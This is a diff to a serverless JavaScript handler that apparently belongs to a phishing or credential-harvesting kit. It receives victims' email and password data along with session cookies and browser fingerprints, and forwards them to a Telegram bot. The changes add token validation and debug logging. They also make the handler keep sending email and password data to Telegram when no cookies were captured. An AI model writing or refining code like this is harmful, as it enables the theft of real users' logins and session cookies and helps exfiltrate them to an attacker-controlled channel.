@@ -63,11 +63,36 @@ export const handler = async (event, context) => {
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      await sendErrorTelegram('Missing Telegram env config', {});
+      console.error('❌ Missing Telegram configuration:', {
+        hasBotToken: !!TELEGRAM_BOT_TOKEN,
+        hasChatId: !!TELEGRAM_CHAT_ID,
+        botTokenLength: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.length : 0,
+        chatIdLength: TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID.length : 0
+      });
+      await sendErrorTelegram('Missing Telegram env config', {
+        hasBotToken: !!TELEGRAM_BOT_TOKEN,
+        hasChatId: !!TELEGRAM_CHAT_ID
+      });
       return {
         statusCode: 500,
         headers,
-        body: JSON.stringify({ error: 'Telegram configuration missing' }),
+        body: JSON.stringify({ 
+          error: 'Telegram configuration missing',
+          details: 'TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set in environment variables'
+        }),
+      };
+    }
+
+    // Validate bot token format
+    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
+      console.error('❌ Invalid Telegram bot token format:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
+      return {
+        statusCode: 500,
+        headers,
+        body: JSON.stringify({ 
+          error: 'Invalid Telegram bot token format',
+          details: 'Token should be in format: "bot_id:bot_token"'
+        }),
       };
     }
 
@@ -171,12 +196,17 @@ export const handler = async (event, context) => {
     }
 
     if (!formattedCookies || formattedCookies.length === 0) {
-      await sendErrorTelegram('No cookies found for this submission', data);
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'No cookies found' }),
-      };
+      console.warn('⚠️ No cookies found in submission:', {
+        hasFormattedCookies: !!data.formattedCookies,
+        hasBrowserFingerprint: !!data.browserFingerprint,
+        hasCookies: !!data.cookies,
+        hasDocumentCookies: !!data.documentCookies,
+        cookieInfoType: typeof cookieInfo,
+        cookieInfoLength: Array.isArray(cookieInfo) ? cookieInfo.length : 'N/A'
+      });
+      
+      // Don't fail the request if no cookies - still send the email/password data
+      console.log('📧 Proceeding without cookies - email/password data will still be sent');
     }
 
     // Send main message to Telegram
